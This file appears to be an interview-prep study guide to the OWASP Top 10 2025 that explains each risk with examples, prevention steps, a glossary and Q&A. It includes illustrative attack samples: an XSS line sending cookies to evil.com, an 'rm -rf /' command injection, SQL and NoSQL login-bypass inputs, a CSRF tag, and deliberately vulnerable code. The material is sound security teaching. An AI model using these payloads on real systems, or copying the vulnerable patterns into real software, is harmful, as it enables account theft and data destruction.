@@ -1,0 +1,543 @@
+# 🛡️ OWASP Top 10 — 2025 Edition
+> **What is OWASP?** Open Web Application Security Project — a non-profit community that publishes the most critical web application security risks. The **Top 10** list is the industry's most referenced security standard. Every security professional, developer, and tester is expected to know it.
+
+---
+
+## 🗺️ Quick Reference Map — All 10 Categories
+
+| # | Category | 2021 Rank | 2025 Rank | Status |
+|---|-----------|-----------|-----------|--------|
+| A01 | Broken Access Control | #1 | #1 | 🔴 Stayed |
+| A02 | Security Misconfiguration | #5 | #2 | 🔺 Moved Up |
+| A03 | Software Supply Chain Failures | #6 (Vulnerable Components) | #3 | 🆕 Expanded |
+| A04 | Cryptographic Failures | #2 | #4 | 🔻 Moved Down |
+| A05 | Injection | #3 | #5 | 🔻 Moved Down |
+| A06 | Insecure Design | #4 | #6 | 🔻 Moved Down |
+| A07 | Authentication Failures | #7 | #7 | 🔴 Stayed |
+| A08 | Software or Data Integrity Failures | #8 | #8 | 🔴 Stayed |
+| A09 | Security Logging & Alerting Failures | #9 | #9 | 🔴 Stayed |
+| A10 | Mishandling of Exceptional Conditions | NEW | #10 | 🆕 New |
+
+---
+
+---
+
+## A01 — Broken Access Control 🥇 #1 Most Critical
+
+### 🔑 What Goes Wrong?
+
+**Principle of Least Privilege Violation** — Users get more access than they need. Example: A regular employee can view the payroll database when only HR should.
+
+**IDOR — Insecure Direct Object Reference** — Accessing resources by changing an ID in the URL.
+```
+# Normal user accessing their own account
+https://bank.com/account?id=1001   ✅
+
+# Attacker changes ID to access someone else's account
+https://bank.com/account?id=1002   ❌ (IDOR Attack)
+```
+
+**Force Browsing / Forced Browsing** — Guessing restricted URLs directly.
+```
+https://app.com/admin/dashboard    # Regular user types this URL directly
+```
+
+**CSRF — Cross-Site Request Forgery** — Tricking a logged-in user's browser into making requests on their behalf.
+```
+<!-- Malicious website sends a hidden request -->
+<img src="https://bank.com/transfer?to=hacker&amount=5000">
+```
+
+**SSRF — Server-Side Request Forgery** — Tricking the server to make requests to internal resources.
+```
+# Attacker submits this URL as a "profile image URL"
+https://internal-admin-panel.local/users  # Server fetches this, leaking internal data
+```
+
+**CORS Misconfiguration** — When a website allows requests from untrusted origins (domains).
+```
+Access-Control-Allow-Origin: *    ❌ Allows any website to read responses
+```
+
+**Privilege Escalation** — A regular user gains admin rights.
+
+**JWT Tampering** — Modifying a JSON Web Token to claim admin roles.
+
+### 🛡️ How to Prevent
+- Apply **deny by default** — block everything, explicitly allow what's needed
+- Enforce access control on the **server side** (not in frontend JavaScript)
+- Invalidate **session tokens** after logout
+- Implement **RBAC (Role-Based Access Control)**
+
+---
+
+---
+
+## A02 — Security Misconfiguration 🔺 (was #5, now #2)
+
+### 🔑 What Goes Wrong?
+
+**Default Credentials** — Admin consoles shipped with username `admin` / password `admin`.
+```
+# Real world: Thousands of IoT devices use default "admin/admin" login
+http://router.local/admin  →  Login: admin / Password: admin  ❌
+```
+
+**Verbose Error Messages / Stack Traces** — Server reveals internal code structure to attackers.
+```
+# What the user sees in a misconfigured app:
+NullPointerException at com.company.app.UserController.getUser(UserController.java:47)
+Database: MySQL 5.7 running on 192.168.1.10   ← Goldmine for attackers!
+```
+
+**Directory Listing Enabled** — Anyone can browse your server's file structure like an open folder.
+```
+http://example.com/uploads/   →  Lists all uploaded files ❌
+```
+
+**Unnecessary Features Enabled** — Test endpoints, debug modes, or unused ports left open in production.
+
+**Missing Security Headers** — HTTP headers that protect browsers are not set.
+```
+Content-Security-Policy: (missing)   ❌
+X-Frame-Options: (missing)           ❌
+```
+
+### 🛡️ How to Prevent
+- Use **hardening** processes — remove all defaults, disable unused features
+- Implement **security headers** (CSP, HSTS, X-Frame-Options)
+- Separate **Dev/QA/Production environments** with different credentials
+- Never leave **debug mode** enabled in production
+---
+
+---
+
+## A03 — Software Supply Chain Failures 🆕 (Expanded from A06:2021)
+
+### 🧠 Simple Explanation
+Your application is only as secure as the **ingredients you build it with**. If you use a library (a pre-built piece of code) that has a hidden vulnerability — or worse, malware injected into it — your whole application becomes compromised. Think of it as a **tainted food supply**: even if your kitchen is clean, bad ingredients ruin the dish.
+
+### 🔑 What Goes Wrong?
+
+**Using Outdated/Vulnerable Components** — Libraries with known CVEs still in use.
+```
+# package.json (Node.js project using a vulnerable library)
+"dependencies": {
+  "lodash": "4.17.4"   ← CVE-2019-10744 (Prototype Pollution)
+}
+```
+
+**Real Example — Log4Shell (2021) CVE-2021-44228:** The Apache Log4j logging library had a critical Remote Code Execution flaw. Since it was used in millions of Java applications, the blast radius was enormous.
+
+### 🛡️ How to Prevent
+- Use tools like **OWASP Dependency-Check**, **Snyk**, or **Dependabot**
+- Monitor **CVE (Common Vulnerabilities and Exposures)** and **NVD (National Vulnerability Database)**
+- Only use packages from **trusted registries** (npm, PyPI, Maven Central)
+
+---
+
+---
+
+## A04 — Cryptographic Failures 🔻 (was #2, now #4)
+
+### 🔑 What Goes Wrong?
+
+**Data Transmitted in Cleartext** — Sending sensitive data over HTTP instead of HTTPS.
+```
+# Bank login over unencrypted HTTP ❌
+POST http://bank.com/login
+Body: username=john&password=secret123  ← Anyone on the same WiFi can see this
+```
+
+**Weak Hashing Algorithms** — Storing passwords with MD5 or SHA-1 which are crackable.
+```python
+# BAD ❌ — MD5 is broken, rainbow table attacks work
+password_hash = md5("mypassword")
+
+# GOOD ✅ — bcrypt/Argon2 with salt and work factor
+password_hash = argon2.hash("mypassword")
+```
+
+**Hardcoded/Weak Encryption Keys** — Using predictable keys or embedding them in source code.
+```python
+SECRET_KEY = "mykey123"   # ❌ Pushed to GitHub, visible to everyone
+```
+
+**Using Deprecated Algorithms** — RC4, DES, MD5, SHA-1 are all broken.
+
+**Missing HSTS** — Browser allowed to use HTTP even when HTTPS exists (downgrade attack).
+
+### 🛡️ How to Prevent
+- Always use **HTTPS/TLS 1.2+** for all data in transit; enforce with **HSTS**
+- Store passwords using **bcrypt**, **Argon2**, **scrypt**, or **PBKDF2** with salts
+- Never use **MD5 or SHA-1** for passwords — use SHA-256+ for non-password hashing
+- Use **AES-256** for symmetric encryption, **RSA-2048+** or **ECC** for asymmetric
+
+---
+
+---
+
+## A05 — Injection 🔻 (was #3, now #5)
+
+### 🔑 What Goes Wrong?
+
+**SQL Injection (SQLi)** — Injecting SQL commands into database queries.
+```python
+# VULNERABLE CODE ❌
+query = "SELECT * FROM users WHERE username='" + input_username + "'"
+
+# Attacker enters: ' OR '1'='1
+# Final query becomes:
+SELECT * FROM users WHERE username='' OR '1'='1'
+# Result: Returns ALL users! Bypasses login entirely
+```
+
+**Cross-Site Scripting (XSS)** — Injecting malicious JavaScript into web pages viewed by other users.
+```javascript
+// Attacker posts this as a comment on a forum:
+<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
+
+// When another user views the page, their browser executes this script
+// and sends their session cookie to the attacker!
+```
+
+> **Stored XSS** — Malicious script stored in the database (most dangerous)
+> **Reflected XSS** — Malicious script in the URL, reflected back immediately
+> **DOM-based XSS** — Script manipulates the DOM without going to the server
+
+**OS Command Injection** — Injecting shell commands into system calls.
+```python
+# VULNERABLE CODE ❌
+import os
+os.system("ping " + user_input)
+
+# Attacker enters: google.com; rm -rf /   ← Deletes server files!
+```
+
+**NoSQL Injection** — Exploiting MongoDB or similar databases.
+```json
+// Attacker sends:
+{ "username": {"$gt": ""}, "password": {"$gt": ""} }
+// Bypasses login by matching all documents!
+```
+
+### 🛡️ How to Prevent
+- Use **Parameterized Queries / Prepared Statements** — the gold standard for SQL injection prevention
+```python
+# SAFE ✅ — parameterized query
+cursor.execute("SELECT * FROM users WHERE username = %s", (input_username,))
+```
+- Use **ORM (Object Relational Mapping)** frameworks (SQLAlchemy, Hibernate) properly
+- **Input Validation** — whitelist allowed characters on server side
+- **Output Encoding** — encode data before rendering in HTML to prevent XSS
+- Use **CSP (Content Security Policy)** headers to restrict what scripts can run
+- Use **WAF (Web Application Firewall)** as a defense-in-depth layer
+
+---
+
+---
+
+## A06 — Insecure Design 🔻 (was #4, now #6)
+
+### 🔑 What Goes Wrong?
+
+**Business Logic Flaws** — The application does something technically correct but logically exploitable.
+```
+# Example: A cinema discount applies to groups of 15+
+# Attacker books 600 seats at all cinemas simultaneously in a few API calls
+# No rate limiting or business rule validation was designed in
+```
+
+**Unrestricted File Upload** — Allowing any file type to be uploaded without validation.
+```python
+# BAD design ❌
+def upload_file(file):
+    save(file)   # Saves .php, .exe, .sh — any file type!
+
+# Attacker uploads malicious.php → visits the URL → executes code on server
+```
+
+**Race Conditions** — When two operations happen simultaneously in a way that creates an exploitable state.
+```
+# Bank transfer: User sends $100 but simultaneously submits request twice
+# Due to race condition, $200 gets deducted or $100 gets sent twice
+```
+
+**Missing Rate Limiting on Business Logic** — No limits on critical actions like purchases, votes, or password attempts.
+
+### 🛡️ How to Prevent
+- Use **Secure Design Patterns** and **Reference Architectures**
+- Apply **Defense in Depth** — multiple security layers
+- Implement **rate limiting**, **CAPTCHA**, and **transaction limits** by design
+- Follow **Secure by Design / Security by Default** principles
+
+---
+
+---
+
+## A07 — Authentication Failures 🔴 (stays at #7)
+
+### 🧠 Simple Explanation
+**Authentication** is proving you are who you claim to be (your ID card). Authentication failures mean the application can be fooled into thinking you're someone else — or accepts you without proper verification. It's like a bouncer who lets everyone in as long as they say "I'm on the list."
+
+### 🔑 What Goes Wrong?
+
+**Credential Stuffing** — Attackers use leaked username/password lists from other breaches.
+```
+# Attacker downloads a breach dump: 1 billion username/password pairs
+# Tries them against your login page automatically
+# ~2-3% success rate = millions of compromised accounts
+```
+
+**Brute Force Attacks** — Systematically trying every possible password.
+```
+# Automated script tries:
+password123, password124, password125... (billions of attempts/second with GPUs)
+```
+
+**Hardcoded Credentials** — Passwords baked into source code.
+```python
+DATABASE_PASSWORD = "SuperSecret123"   # ❌ Anyone with code access has DB access!
+```
+
+**Weak Session Management** — Session IDs that are predictable or not invalidated on logout.
+```
+# Session ID in URL ❌
+https://app.com/dashboard?sessionid=abc123   # Visible in logs, browser history!
+
+# Session not invalidated after logout → attacker can reuse old session
+```
+
+**Weak Password Policies** — Allowing "123456" or "password" as valid passwords.
+
+**Insecure "Forgot Password"** — Reset links that don't expire, or security questions that are guessable.
+
+### 🛡️ How to Prevent
+- Implement **MFA (Multi-Factor Authentication)** — especially TOTP or hardware keys
+- Check new passwords against **Have I Been Pwned** breach database
+- Implement **account lockout** or **progressive delays** after failed attempts
+- Use server-side **session management** with **high-entropy session IDs**
+- Invalidate sessions on **logout** and after **idle timeout**
+- Never expose session IDs in URLs — store in **HttpOnly, Secure cookies**
+- Use **OAuth 2.0 / OpenID Connect** for federated authentication
+
+---
+
+---
+
+## A08 — Software or Data Integrity Failures 🔴 (stays at #8)
+
+### 🧠 Simple Explanation
+When you download an app update, you **trust** it's the real, unmodified version from the developer. Software integrity failures happen when that trust is misplaced — either an update is tampered with, untrusted code is executed, or data is manipulated without detection. It's the **chain of custody** for software.
+
+### 🔑 What Goes Wrong?
+
+**Insecure Deserialization** — Converting attacker-controlled serialized data back into executable objects.
+```java
+// VULNERABLE ❌ — Deserializing untrusted data
+ObjectInputStream ois = new ObjectInputStream(userInput);
+Object obj = ois.readObject();   // Can execute arbitrary code during deserialization!
+
+// Attackers craft malicious serialized objects that trigger RCE (Remote Code Execution)
+```
+
+**Unsigned Auto-Updates** — Application installs updates without verifying digital signatures.
+```
+# Router firmware update without signature check
+Router downloads: update.bin from attacker-controlled mirror
+Installs → Attacker now controls the router
+```
+
+**Loading from Untrusted CDNs** — Including external JavaScript libraries without integrity checks.
+```html
+<!-- BAD ❌ — If CDN is compromised, malicious code runs on your site -->
+<script src="https://cdn.example.com/library.js"></script>
+
+<!-- GOOD ✅ — SRI (Subresource Integrity) ensures file hasn't been tampered with -->
+<script src="https://cdn.example.com/library.js"
+        integrity="sha256-abc123..."
+        crossorigin="anonymous"></script>
+```
+
+**Malicious npm/pip Packages** — Installing packages from untrusted sources that contain malware.
+
+**SolarWinds Hack (2020)** — Attackers modified build artifacts inside SolarWinds' CI/CD pipeline, injecting a backdoor that was then legitimately signed and distributed to 18,000+ organizations.
+
+### 🛡️ How to Prevent
+- Use **digital signatures** to verify software authenticity (code signing)
+- Use **SRI (Subresource Integrity)** for CDN-hosted assets
+- Implement **integrity checks** in CI/CD pipelines — sign and verify all artifacts
+- Use trusted, verified package registries with locked versions
+- Never deserialize data from untrusted sources without strict validation
+- Use **immutable artifacts** — build once, promote the same artifact through environments
+- Implement **code review** and **pull request (PR) approvals** before merging
+---
+
+---
+
+## A09 — Security Logging & Alerting Failures 🔴 (stays at #9)
+
+### 🧠 Simple Explanation
+If your house is robbed but you have no **security camera, no alarm, and no record of who entered** — you won't know a crime happened until you find things missing. Security logging is your camera. Alerting is your alarm. Without them, attackers can operate for months or years undetected.
+
+> Real statistic: The average **dwell time** (time attackers are in your network before detection) is **197 days** (IBM Cost of a Data Breach Report).
+
+### 🔑 What Goes Wrong?
+
+**No Logging of Critical Events** — Failed logins, privilege changes, or data exports not recorded.
+```python
+# BAD ❌ — Silent failure, nothing logged
+def login(username, password):
+    if not authenticate(username, password):
+        return "Invalid credentials"   # No log, no alert!
+```
+
+**Logging Sensitive Data** — Passwords, credit card numbers, or PII written into logs.
+```
+# BAD ❌ — Password in logs!
+INFO: User login attempt: username=john password=mySecret123
+```
+
+**Log Injection** — Attacker manipulates log entries to hide their tracks or inject malicious data.
+```
+# Attacker enters username: "admin\nINFO: Login successful for admin"
+# Log becomes:
+ERROR: Failed login for admin
+INFO: Login successful for admin   ← Fake! Attacker hides real failure
+```
+
+**Logs Not Monitored / No Alerting** — Logs exist but nobody reads them; no automated alerts.
+
+**No Incident Response Plan** — Even when an attack is detected, no playbook exists to respond.
+
+**Too Many False Positives** — Alert fatigue causes real threats to be ignored.
+
+**Real World Example:** A children's health plan provider had a breach where **3.5 million health records** were compromised over **7+ years** — entirely undetected due to zero logging and monitoring.
+
+### 🛡️ How to Prevent
+- Log all **authentication events** (success and failure), **access control failures**, and **high-value transactions**
+- Never log **PII (Personally Identifiable Information)**, passwords, or card numbers
+- Protect log integrity — use **append-only** storage or tamper-evident logs
+---
+
+---
+
+## A10 — Mishandling of Exceptional Conditions 🆕 (NEW in 2025)
+
+### 🧠 Simple Explanation
+Every program can face **unexpected situations**: a server runs out of memory, a database times out, a user sends malformed data, a network drops. How an application **responds** to these situations determines whether it stays secure or creates vulnerabilities. Bad error handling is like a bank teller who walks away from the counter mid-transaction if they don't know the answer — leaving your money floating in limbo.
+
+### 🔑 What Goes Wrong?
+
+**Verbose Error Messages** — System reveals internal details through error responses.
+
+**Resource Exhaustion / DoS via Poor Error Handling** — Exceptions don't release resources.
+
+**State Corruption in Transactions** — An interrupted transaction leaves data in an inconsistent state.
+```
+# Financial transaction scenario:
+Step 1: Debit user account ✅
+Step 2: Credit destination account ❌ (network error here!)
+# Without proper rollback: User's money is gone but destination wasn't credited!
+```
+
+**Missing Parameter Handling** — Application crashes when expected parameters are absent.
+
+### 🛡️ How to Prevent
+- Implement a **global exception handler** as a safety net
+- Show **generic error messages** to users; log detailed errors internally
+- Always **rollback transactions** on error — atomic operations
+- Implement **rate limiting** and **resource quotas** to prevent resource exhaustion
+- Validate all inputs to **prevent exceptional conditions** in the first place
+
+---
+
+---
+
+### 🔤 Full Glossary of Interview Terms
+
+| Term | Definition |
+|------|-----------|
+| **OWASP** | Open Web Application Security Project |
+| **CWE** | Common Weakness Enumeration — a list of software weakness types |
+| **CVE** | Common Vulnerabilities and Exposures — specific named vulnerabilities |
+| **CVSS** | Common Vulnerability Scoring System — rates severity 0-10 |
+| **NVD** | National Vulnerability Database — US government CVE database |
+| **IDOR** | Insecure Direct Object Reference — accessing resources by changing IDs |
+| **SSRF** | Server-Side Request Forgery — server makes requests to internal resources |
+| **CSRF** | Cross-Site Request Forgery — tricking a user's browser to make requests |
+| **XSS** | Cross-Site Scripting — injecting JavaScript into pages |
+| **SQLi** | SQL Injection — injecting SQL commands into queries |
+| **RCE** | Remote Code Execution — executing code on a remote server |
+| **RBAC** | Role-Based Access Control |
+| **MFA** | Multi-Factor Authentication |
+| **JWT** | JSON Web Token — stateless authentication token |
+| **OAuth 2.0** | Authorization framework |
+| **OIDC** | OpenID Connect — authentication layer on top of OAuth 2.0 |
+| **TLS/SSL** | Transport Layer Security — encrypts data in transit |
+| **HSTS** | HTTP Strict Transport Security — forces HTTPS |
+| **CSP** | Content Security Policy — limits what scripts can run |
+| **CORS** | Cross-Origin Resource Sharing |
+| **SBOM** | Software Bill of Materials — inventory of all software components |
+| **SAST** | Static Application Security Testing — analyzes source code |
+| **DAST** | Dynamic Application Security Testing — tests running application |
+| **IAST** | Interactive Application Security Testing |
+| **WAF** | Web Application Firewall |
+| **SIEM** | Security Information and Event Management |
+| **SOC** | Security Operations Center |
+| **IaC** | Infrastructure as Code |
+| **CI/CD** | Continuous Integration / Continuous Deployment |
+| **PII** | Personally Identifiable Information |
+| **PHI** | Protected Health Information |
+| **GDPR** | General Data Protection Regulation (EU) |
+| **Threat Modeling** | Identifying potential threats during design |
+| **Penetration Testing** | Authorized simulated attack to find vulnerabilities |
+| **Zero-Day** | Vulnerability unknown to the vendor |
+| **Dwell Time** | Time attacker is undetected in a system |
+| **Honeytoken** | Fake credential used to detect intrusions |
+| **Fail Closed** | Deny access when uncertain (secure default) |
+| **Shift-Left** | Moving security earlier in development lifecycle |
+| **Defense in Depth** | Multiple layers of security controls |
+
+---
+
+### 🎯 Most Common Interview Questions for Freshers
+
+**Q: What is the difference between Authentication and Authorization?**
+> **Authentication** = Verifying *who you are* (login with username/password). **Authorization** = Verifying *what you're allowed to do* (access control). A01 covers Authorization failures; A07 covers Authentication failures.
+
+**Q: What is SQL Injection and how do you prevent it?**
+> SQL Injection is when attacker-controlled input is executed as SQL commands. Prevented by using **parameterized queries / prepared statements** and never concatenating user input into SQL strings.
+
+**Q: What is XSS and what are its types?**
+> Cross-Site Scripting — injecting malicious JavaScript. Types: **Stored** (saved to DB, most dangerous), **Reflected** (in URL, reflected back), **DOM-based** (client-side manipulation).
+
+**Q: What is the difference between Encryption and Hashing?**
+> **Encryption** is reversible with a key (used for data you need to read again). **Hashing** is one-way (used for passwords — you compare hashes, never decrypt).
+
+**Q: What is IDOR?**
+> Insecure Direct Object Reference — accessing someone else's data by changing a predictable ID in the URL/API request (e.g., `?user_id=123` → `?user_id=124`).
+
+**Q: What is a supply chain attack?**
+> Compromising software through its dependencies, build tools, or third-party components rather than attacking the target directly. Famous examples: SolarWinds, Log4Shell.
+
+---
+
+## 📚 Quick Summary Card
+
+```
+OWASP Top 10 : 2025
+
+A01 Broken Access Control       → Who can access what?
+A02 Security Misconfiguration   → Is the setup secure?
+A03 Supply Chain Failures       → Are dependencies safe?
+A04 Cryptographic Failures      → Is data properly encrypted?
+A05 Injection                   → Is user input safely handled?
+A06 Insecure Design             → Was security planned from the start?
+A07 Authentication Failures     → Can users prove who they are?
+A08 Integrity Failures          → Is software/data tampered with?
+A09 Logging & Alerting Failures → Can breaches be detected?
+A10 Exceptional Conditions      → Does the app handle errors safely?
+```
+
+---
